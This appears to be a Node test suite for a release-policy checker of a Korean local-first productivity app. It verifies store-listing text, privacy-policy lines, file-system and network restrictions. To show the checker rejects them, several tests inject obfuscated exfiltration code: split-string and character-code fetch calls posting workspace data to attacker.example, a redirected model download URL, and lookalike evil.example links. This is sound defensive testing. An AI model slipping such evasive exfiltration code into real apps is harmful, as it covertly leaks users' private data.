import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import test from "node:test";
import {
  loadReleaseFiles,
  validateReleasePolicy
} from "./check-non-medical-release.mjs";

const root = resolve(import.meta.dirname, "..");
const baseline = loadReleaseFiles(root);
const storeListingFile = "docs/store-listing.md";
const expoFileSystemDeclarationFiles = [
  "index.d.ts",
  "FileSystem.d.ts",
  "ExpoFileSystem.types.d.ts",
  "legacyWarnings.d.ts",
  "pathUtilities/index.d.ts",
  "legacy/index.d.ts",
  "legacy/FileSystem.d.ts",
  "legacy/FileSystem.types.d.ts"
];
const expoFileSystemTypeDeclarations = new Map(
  expoFileSystemDeclarationFiles.map((file) => [
    file,
    readFileSync(
      resolve(root, "node_modules/expo-file-system/build", file),
      "utf8"
    )
  ])
);

function mutate(file, transform) {
  const files = new Map(baseline);
  files.set(file, transform(files.get(file)));
  return validateReleasePolicy(files);
}

function replaceLevelThreeSection(source, heading, replacement) {
  const escapedHeading = heading.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const sectionPattern = new RegExp(
    `(### ${escapedHeading}\\r?\\n\\r?\\n)[\\s\\S]*?(?=\\r?\\n### |\\r?\\n## |$)`
  );
  assert.match(source, sectionPattern);
  return source.replace(
    sectionPattern,
    (_section, prefix) => `${prefix}${replacement}\n`
  );
}

test("accepts exact line-level policy, legacy, and network contracts", () => {
  assert.equal(validateReleasePolicy(baseline).status, "pass");
});

test("loads the Play Store listing policy artifact into the release inventory", () => {
  assert.equal(loadReleaseFiles(root).has(storeListingFile), true);
});

test("rejects a return to singular wording for the approved two-model Play choice", () => {
  const approvedText =
    "• 사용자가 설치를 선택한 경우에만 승인·고정된 NAVER HyperCLOVA X GGUF 2개 중 선택한 모델 하나를 Hugging Face에서 내려받습니다.";
  const singularText =
    "• 사용자가 설치를 선택한 경우에만 고정된 NAVER HyperCLOVA X GGUF 모델을 Hugging Face에서 내려받습니다.";
  const source = baseline.get(storeListingFile);
  assert.match(source, new RegExp(approvedText.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));

  const report = mutate(storeListingFile, (current) =>
    current.replace(approvedText, singularText)
  );

  assert.equal(report.status, "fail");
  assert.match(
    report.problems.join("\n"),
    /Play Store Korean full description must exactly match/
  );
});

test("rejects removal of public privacy scope, deletion, language, and Android contracts", () => {
  const requiredLines = [
    '  <p class="language-link"><a href="#english" lang="en">English reference translation</a></p>',
    "  <p><strong>제품 범위:</strong> 생활후견 AI는 일반 개인 생산성 앱이며 건강·의료 기능을 제공하거나 건강 데이터를 다루지 않습니다.</p>",
    "  <p>현재 Google Play용 Android 앱은 작업공간을 SQLCipher 데이터베이스에 저장하고 데이터베이스 키를 SecureStore와 Android Keystore 경계에 분리합니다. 앱은 기기 인증, 백그라운드 잠금, 화면 캡처 차단을 사용하며 Android 백업을 비활성화합니다.</p>",
    "  <p>웹의 <strong>이 브라우저의 작업공간 삭제</strong>는 IndexedDB의 사용자 레코드를 삭제 상태를 나타내는 비식별 tombstone으로 바꾸고 이전 버전의 앱 소유 localStorage 키를 제거합니다. tombstone에는 사용자 내용이 없으며 이전 데이터의 재유입만 막습니다.</p>",
    '  <section id="english" lang="en">',
    "  <p><strong>Product scope:</strong> Life Steward AI is a general personal-productivity app and does not provide health or medical features or handle health data.</p>",
    "  <p>The web deletion action replaces the IndexedDB user record with a data-free tombstone and removes app-owned legacy localStorage keys. The tombstone contains no user content and only prevents re-import of old data.</p>"
  ];

  for (const line of requiredLines) {
    assert.ok(
      baseline.get("public/privacy-policy.html").includes(line),
      `missing baseline contract: ${line}`
    );
    const report = mutate(
      "public/privacy-policy.html",
      (source) => source.replace(line, "")
    );
    assert.equal(report.status, "fail", line);
    assert.match(report.problems.join("\n"), /policy contract/);
  }
});

test("rejects drift from the exact Korean Play Console copy", () => {
  const report = mutate(storeListingFile, (source) =>
    source.replace(
      "일정·메모·체크리스트를 정리하고 선택형 한국어 AI를 기기에서 실행하는 로컬 우선 작업공간",
      "일정·메모·체크리스트를 정리하고 선택형 한국어 AI를 기기에서 실행하는 변경된 작업공간"
    )
  );

  assert.equal(report.status, "fail");
  assert.match(
    report.problems.join("\n"),
    /Play Store Korean short description must exactly match/
  );
});

test("rejects duplicate Korean Play Console section headings", () => {
  for (const heading of [
    "앱 이름",
    "짧은 설명 (80자 이내)",
    "전체 설명",
    "출시 노트"
  ]) {
    const report = mutate(storeListingFile, (source) =>
      source.replace(
        "\n### Play Console 적용값",
        `\n### ${heading}\n\n복제 검증용\n\n### Play Console 적용값`
      )
    );
    assert.equal(report.status, "fail", heading);
    assert.ok(
      report.problems.some((problem) =>
        problem.includes(
          `Play Store Korean ${heading} heading must occur exactly once`
        )
      ),
      `${heading}: ${report.problems.join("\n")}`
    );
  }
});

test("rejects every over-limit Korean Play Console field", () => {
  const overLimitCases = [
    {
      heading: "앱 이름",
      replacement: "가".repeat(31),
      expected: /Play Store Korean app name exceeds 30 characters/
    },
    {
      heading: "짧은 설명 (80자 이내)",
      replacement: "가".repeat(81),
      expected: /Play Store Korean short description exceeds 80 characters/
    },
    {
      heading: "전체 설명",
      replacement: "가".repeat(4001),
      expected: /Play Store Korean full description exceeds 4000 characters/
    },
    {
      heading: "출시 노트",
      replacement: "가".repeat(501),
      expected: /Play Store Korean release notes exceeds 500 characters/
    }
  ];

  for (const { heading, replacement, expected } of overLimitCases) {
    const report = mutate(storeListingFile, (source) =>
      replaceLevelThreeSection(source, heading, replacement)
    );
    assert.equal(report.status, "fail", heading);
    assert.match(report.problems.join("\n"), expected, heading);
  }
});

test("rejects health terms outside the one required Korean disclaimer", () => {
  const report = mutate(storeListingFile, (source) =>
    source.replace(
      "일반 개인 생산성 앱이며 건강·의료 기능이나 건강 데이터를 다루지 않습니다.",
      "일반 개인 생산성 앱이며 건강·의료 기능이나 건강 데이터를 다루지 않습니다. 건강 기능 없음."
    )
  );

  assert.equal(report.status, "fail");
  assert.match(
    report.problems.join("\n"),
    /Play Store Korean full description contains forbidden health terms outside the exact disclaimer/
  );
});

test("rejects EAS production builds that can mutate the pinned Android version", () => {
  const files = new Map(baseline);
  files.set(
    "apps/mobile/eas.json",
    JSON.stringify({
      cli: { appVersionSource: "local" },
      build: {
        production: {
          autoIncrement: true,
          android: { buildType: "app-bundle" }
        }
      }
    })
  );

  const report = validateReleasePolicy(files);
  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /EAS production version policy/);
});

test("rejects a prohibited health feature hidden in a formerly allowlisted file", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}\nexport const healthDiagnosisFeature = "진단 지원";\n`
  );
  assert.match(report.problems.join("\n"), /unapproved health/);
});

test("rejects cloud surface and network APIs hidden in a policy file", () => {
  const report = mutate(
    "packages/life-core/src/policy.ts",
    (source) => `${source}\nconst analytics = fetch("/collect");\n`
  );
  const problems = report.problems.join("\n");
  assert.match(problems, /health or cloud/);
  assert.match(problems, /network API/);
});

test("rejects dynamic and concatenated remote endpoints without a literal complete URL", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}\nconst endpoint = "https" + "://attacker.example";\nfetch(endpoint);\n`
  );
  const problems = report.problems.join("\n");
  assert.match(problems, /computed remote URL/);
  assert.match(problems, /network API/);
});

test("rejects split global fetch names and array-joined production-only exfiltration URLs", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const netName = "fet" + "ch";
const remote = ["h", "ttps", ":", "/", "/", "attacker.example/collect"].join("");
if ((globalThis as any).navigator?.product === "ReactNative") {
  void (globalThis as any)[netName](remote, {
    method: "POST",
    body: JSON.stringify({ workspace: "private" })
  });
}
`
  );
  const problems = report.problems.join("\n");
  assert.equal(report.status, "fail");
  assert.match(problems, /computed remote URL/);
  assert.match(problems, /unapproved network API \(fetch\)/);
});

test("rejects aliased template endpoints and unresolved computed global calls fail closed", () => {
  const aliased = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const transportName = \`fet\${"ch"}\`;
const remoteHost = "attacker.example";
const remoteEndpoint = \`https://\${remoteHost}/collect\`;
const transport = (globalThis as any)[transportName];
void transport(remoteEndpoint);
`
  );
  const dynamic = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
declare function chooseTransport(): string;
void (globalThis as any)[chooseTransport()]("/collect");
`
  );

  assert.match(aliased.problems.join("\n"), /network API \(fetch\)/);
  assert.match(aliased.problems.join("\n"), /computed remote URL/);
  assert.match(dynamic.problems.join("\n"), /dynamic global network capability/);
});

test("rejects Reflect.get plus character-code restoration of a React Native-only transport", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const reviewTransport = Reflect.get(
  globalThis,
  String.fromCharCode(102, 101, 116, 99, 104)
) as (...args: any[]) => unknown;
const reviewEndpoint = String.fromCharCode(
  104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,
  101,120,97,109,112,108,101,47,99,111,108,108,101,99,116
);
if ((globalThis as any).navigator?.product === "ReactNative") {
  void reviewTransport(reviewEndpoint, {
    method: "POST",
    body: JSON.stringify({ workspace: "private" })
  });
}
`
  );

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /reflect|dynamic capability|global object/i);
});

test("rejects dynamic code constructors, proxies, and every computed call surface", () => {
  const dynamicCode = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const runtimeEval = eval;
const RuntimeFunction = Function;
const runtimeProxy = new Proxy({}, {});
void runtimeEval("1");
void new RuntimeFunction("return 1");
void runtimeProxy;
`
  );
  const computedCall = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const handlers = { safe: () => undefined };
const selectedHandler = "safe";
handlers[selectedHandler]();
`
  );

  assert.match(dynamicCode.problems.join("\n"), /dynamic code|Proxy|eval|Function/i);
  assert.match(computedCall.problems.join("\n"), /computed call/i);
});

test("rejects direct or aliased mutation of built-in facades", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const reviewObjectFacade = Object;
Object.defineProperty(reviewObjectFacade, "freeze", {
  value: <T>(input: T): T => input
});
reviewObjectFacade.isFrozen = (_input: unknown): boolean => true;
`
  );

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /built-in facade mutation/i);
});

test("rejects hiding a global network capability inside an object facade", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const reviewNetworkFacade = { transport: fetch };
void reviewNetworkFacade.transport("/collect");
`
  );

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /unapproved network API \(fetch\)/i);
});

test("rejects every legacy upload surface and the new expo-file-system download API", () => {
  const directUpload = mutate(
    "apps/mobile/src/ui/LocalAiSettingsScreen.tsx",
    (source) => source.replace(
      "      const text = await FileSystem.readAsStringAsync(uri);",
      `      const text = await FileSystem.readAsStringAsync(uri);
      await FileSystem.uploadAsync("/collect", uri);`
    )
  );
  const uploadTask = mutate(
    "apps/mobile/src/local-ai/modelStore.ts",
    (source) => `${source}
async function reviewUpload(uri: string): Promise<void> {
  const ExpoFileSystem = await import("expo-file-system/legacy");
  const task = ExpoFileSystem.createUploadTask("/collect", uri);
  await task.uploadAsync();
}
`
  );
  const newApi = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
async function reviewNewFileSystemApi(file: unknown): Promise<void> {
  const NewFileSystem = await import("expo-file-system");
  await NewFileSystem.File.downloadFileAsync("/collect", file as never);
}
`
  );

  for (const report of [directUpload, uploadTask, newApi]) {
    assert.equal(report.status, "fail");
    assert.match(
      report.problems.join("\n"),
      /expo-file-system|upload|downloadFileAsync|network API/i
    );
  }
});

test("rejects extra file-system imports, destructuring, aliases, and computed members", () => {
  const extraStaticImport = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
import * as ReviewFileSystem from "expo-file-system/legacy";
void ReviewFileSystem.getInfoAsync("file:///private");
`
  );
  const destructured = mutate(
    "apps/mobile/src/ui/LocalAiSettingsScreen.tsx",
    (source) => source.replace(
      '      const FileSystem = await import("expo-file-system/legacy");',
      '      const { readAsStringAsync: FileSystemRead } = await import("expo-file-system/legacy");'
    ).replace(
      "      const text = await FileSystem.readAsStringAsync(uri);",
      "      const text = await FileSystemRead(uri);"
    )
  );
  const aliased = mutate(
    "apps/mobile/src/local-ai/modelStore.ts",
    (source) => source.replace(
      "    await ExpoFileSystem.makeDirectoryAsync(uri, { intermediates: true });",
      `    const FileSystemAlias = ExpoFileSystem;
    await FileSystemAlias.makeDirectoryAsync(uri, { intermediates: true });`
    )
  );
  const computed = mutate(
    "apps/mobile/src/storage/mobileWorkspaceRepository.ts",
    (source) => source.replace(
      "FileSystem.getInfoAsync(databaseFileUri(directory, name))",
      'FileSystem["getInfoAsync"](databaseFileUri(directory, name))'
    )
  );

  for (const report of [extraStaticImport, destructured, aliased, computed]) {
    assert.equal(report.status, "fail");
    assert.match(
      report.problems.join("\n"),
      /expo-file-system|computed call|namespace|import|member/i
    );
  }
});

test("fails closed when either expo-file-system entry point gains a public API", () => {
  const legacyDeclarations = new Map(expoFileSystemTypeDeclarations);
  legacyDeclarations.set(
    "legacy/FileSystem.d.ts",
    `${legacyDeclarations.get("legacy/FileSystem.d.ts")}
export declare function transmitFileAsync(url: string, fileUri: string): Promise<void>;
`
  );
  const mainDeclarations = new Map(expoFileSystemTypeDeclarations);
  mainDeclarations.set(
    "ExpoFileSystem.types.d.ts",
    `${mainDeclarations.get("ExpoFileSystem.types.d.ts")}
export declare function transmitFileAsync(url: string, fileUri: string): Promise<void>;
`
  );

  for (const declarations of [legacyDeclarations, mainDeclarations]) {
    const report = validateReleasePolicy(baseline, {
      expoFileSystemTypeDeclarations: declarations
    });
    assert.equal(report.status, "fail");
    assert.match(report.problems.join("\n"), /expo-file-system.*inventory/i);
  }
});

test("fails closed when the installed expo-file-system version drifts", () => {
  const report = validateReleasePolicy(baseline, {
    expoFileSystemVersion: "19.0.24"
  });

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /expo-file-system installed version mismatch/i);
});

test("rejects require aliases and every indirect loader invocation shape", () => {
  const cases = [
    ["alias", `
const reviewLoader = require;
void reviewLoader("expo-file-system/legacy");
`],
    ["call", `
void require.call(undefined, "expo-file-system/legacy");
`],
    ["apply", `
void require.apply(undefined, ["expo-file-system/legacy"]);
`],
    ["bind", `
const reviewLoader = require.bind(undefined);
void reviewLoader("expo-file-system/legacy");
`],
    ["sequence", `
void (0, require)("expo-file-system/legacy");
`],
    ["module member", `
void module.require("expo-file-system/legacy");
`],
    ["computed member", `
const reviewLoader = module["requ" + "ire"];
void reviewLoader("expo-file-system/legacy");
`],
    ["module facade alias", `
const reviewModuleFacade = module;
const reviewLoaderName = Date.now() > 0 ? "require" : "other";
const reviewLoader = reviewModuleFacade[reviewLoaderName];
void reviewLoader("expo-file-system/legacy");
`],
    ["global member", `
void globalThis.require("expo-file-system/legacy");
`],
    ["destructure", `
const { require: reviewLoader } = module;
void reviewLoader("expo-file-system/legacy");
`],
    ["return", `
function reviewLoaderFactory() {
  return require;
}
void reviewLoaderFactory()("expo-file-system/legacy");
`],
    ["pass", `
function reviewUseLoader(loader: (id: string) => unknown) {
  return loader("expo-file-system/legacy");
}
void reviewUseLoader(require);
`],
    ["createRequire", `
import { createRequire } from "node:module";
const reviewLoader = createRequire(import.meta.url);
void reviewLoader("expo-file-system/legacy");
`],
    ["builtin module", `
const reviewNodeModule = process.getBuiltinModule("node:module");
const reviewLoader = reviewNodeModule.createRequire(import.meta.url);
void reviewLoader("expo-file-system/legacy");
`]
  ];
  const results = cases.map(([name, suffix]) => [
    name,
    mutate(
      "apps/mobile/src/local-ai/assistantPolicy.ts",
      (source) => `${source}${suffix}`
    )
  ]);
  const escaped = results
    .filter(([, report]) => report.status === "pass")
    .map(([name]) => name);

  assert.deepEqual(escaped, []);
  for (const [, report] of results) {
    assert.match(
      report.problems.join("\n"),
      /module loader|require|node:module|global object/i
    );
  }
});

test("allows only exact direct literal require contracts", () => {
  const directFileSystem = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
void require("expo-file-system/legacy").getInfoAsync("file:///private");
`
  );
  const nonLiteral = mutate(
    "apps/mobile/src/local-ai/assistantPolicy.ts",
    (source) => `${source}
const reviewModuleName = "expo-file-system/legacy";
void require(reviewModuleName);
`
  );
  const changedApprovedModule = mutate(
    "apps/mobile/metro.config.js",
    (source) => source.replace(
      'const path = require("path");',
      'const path = require("node:path");'
    )
  );
  const changedCpuPluginLoader = mutate(
    "apps/mobile/plugins/with-cpu-only-llama.js",
    (source) => source.replace(
      'const { withAppBuildGradle } = require("@expo/config-plugins");',
      'const { withAppBuildGradle } = require("@expo/config-plugins/unsafe");'
    )
  );
  const duplicatedMobilePluginExport = mutate(
    "apps/mobile/plugins/with-mobile-react-root.js",
    (source) => `${source}
module.exports = withMobileReactRoot;
`
  );

  for (
    const report of [
      directFileSystem,
      nonLiteral,
      changedApprovedModule,
      changedCpuPluginLoader,
      duplicatedMobilePluginExport
    ]
  ) {
    assert.equal(report.status, "fail");
    assert.match(report.problems.join("\n"), /expo-file-system|require|module loader|module export/i);
  }
});

test("requires the canonical SQLite file URI adapter for existence checks", () => {
  const bypassedAdapter = mutate(
    "apps/mobile/src/storage/mobileWorkspaceRepository.ts",
    (source) => source.replace(
      "FileSystem.getInfoAsync(databaseFileUri(directory, name))",
      "FileSystem.getInfoAsync(name)"
    )
  );
  const swappedArguments = mutate(
    "apps/mobile/src/storage/mobileWorkspaceRepository.ts",
    (source) => source.replace(
      "FileSystem.getInfoAsync(databaseFileUri(directory, name))",
      "FileSystem.getInfoAsync(databaseFileUri(name, directory))"
    )
  );
  const substitutedAdapter = mutate(
    "apps/mobile/src/storage/mobileWorkspaceRepository.ts",
    (source) => source.replace(
      "FileSystem.getInfoAsync(databaseFileUri(directory, name))",
      "FileSystem.getInfoAsync(resolveDatabaseFile(directory, name))"
    )
  );

  for (const report of [
    bypassedAdapter,
    swappedArguments,
    substitutedAdapter
  ]) {
    assert.equal(report.status, "fail");
    assert.match(
      report.problems.join("\n"),
      /forbidden expo-file-system surface|member inventory mismatch/
    );
  }
});

test("rejects an array-joined remote URL used in a conditional registry mutation", () => {
  const report = mutate(
    "apps/mobile/src/local-ai/modelRegistry.ts",
    (source) => `${source}
if ((globalThis as any).navigator?.product === "ReactNative") {
  (MODEL_REGISTRY[0] as { downloadUrl: string }).downloadUrl =
    ["h", "ttps", ":", "/", "/", "attacker.example/model.gguf"].join("");
}
`
  );

  assert.equal(report.status, "fail");
  assert.match(report.problems.join("\n"), /computed remote URL/);
});

test("rejects changes or duplicates in intentional denial and FCM-free lines", () => {
  const report = mutate(
    "apps/mobile/scripts/verify-no-remote-push.mjs",
    (source) => source.replace(
      '  ["Firebase Messaging", /com\\.google\\.firebase:firebase-messaging/i],',
      '  ["Firebase Messaging", /com\\.google\\.firebase:firebase-optional/i],'
    )
  );
  const problems = report.problems.join("\n");
  assert.match(problems, /unapproved health or cloud/);
  assert.match(problems, /must occur exactly once/);
});

test("rejects removal of any custom local-notification release boundary", () => {
  const removals = [
    [
      "apps/mobile/modules/life-local-notifications/expo-module.config.json",
      '      "expo.modules.lifelocalnotifications.LifeLocalNotificationsModule"'
    ],
    [
      "apps/mobile/modules/life-local-notifications/android/src/main/AndroidManifest.xml",
      '  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />'
    ],
    [
      "apps/mobile/modules/life-local-notifications/android/src/main/java/expo/modules/lifelocalnotifications/NotificationScheduler.kt",
      "    alarmManager.setAndAllowWhileIdle("
    ],
    [
      "apps/mobile/scripts/verify-native-android-contracts.mjs",
      '    runGradleContract(":life-local-notifications:compileDebugKotlin", {'
    ],
    [
      "apps/mobile/scripts/verify-no-remote-push.mjs",
      '  ["Firebase Messaging", /com\\.google\\.firebase:firebase-messaging/i],'
    ]
  ];

  for (const [file, line] of removals) {
    const report = mutate(
      file,
      (source) => source.replace(line, "")
    );
    assert.match(
      report.problems.join("\n"),
      /local-only notification manifest hardening/
    );
  }
});

test("rejects every legacy Expo notification dependency or plugin form", () => {
  const withStringPlugin = mutate(
    "apps/mobile/app.json",
    (source) => source.replace(
      '      "expo-font",',
      '      "expo-notifications",\n      "expo-font",'
    )
  );
  const withArrayPlugin = mutate(
    "apps/mobile/app.json",
    (source) => source.replace(
      '      "expo-font",',
      '      ["expo-notifications", {}],\n      "expo-font",'
    )
  );
  const withLegacyPlugin = mutate(
    "apps/mobile/app.json",
    (source) => source.replace(
      '      "expo-font",',
      '      "./plugins/with-local-only-notifications",\n      "expo-font",'
    )
  );
  const withDependency = mutate(
    "apps/mobile/package.json",
    (source) => source.replace(
      '    "expo-local-authentication": "~17.0.8",',
      '    "expo-local-authentication": "~17.0.8",\n    "expo-notifications": "~0.32.16",'
    )
  );

  for (const report of [
    withStringPlugin,
    withArrayPlugin,
    withLegacyPlugin,
    withDependency
  ]) {
    assert.equal(report.status, "fail");
    assert.match(
      report.problems.join("\n"),
      /legacy Expo notification|expo-notifications/
    );
  }
});

test("allows only exact public policy and privacy contact links", () => {
  const alteredPolicyHost = mutate(
    "apps/mobile/src/legal/externalLinks.ts",
    (source) => source.replace(
      "https://huggingface.co/privacy",
      "https://huggingface.co.evil.example/privacy"
    )
  );
  const alteredPolicyPath = mutate(
    "apps/mobile/src/legal/externalLinks.ts",
    (source) => source.replace(
      "https://huggingface.co/privacy",
      "https://huggingface.co/privacy/"
    )
  );
  const alteredAppPolicy = mutate(
    "apps/mobile/src/legal/externalLinks.ts",
    (source) => source.replace(
      "https://sinmb79.github.io/careguardian-ai/privacy-policy.html",
      "https://sinmb79.github.io.evil.example/careguardian-ai/privacy-policy.html"
    )
  );
  const alteredPrivacyContact = mutate(
    "public/privacy-policy.html",
    (source) => source.replaceAll(
      "mailto:privacy@huggingface.co",
      "mailto:privacy@huggingface.co.evil.example"
    )
  );

  for (const report of [
    alteredPolicyHost,
    alteredPolicyPath,
    alteredAppPolicy,
    alteredPrivacyContact
  ]) {
    assert.equal(report.status, "fail");
    assert.match(report.problems.join("\n"), /unapproved external link/);
  }
});
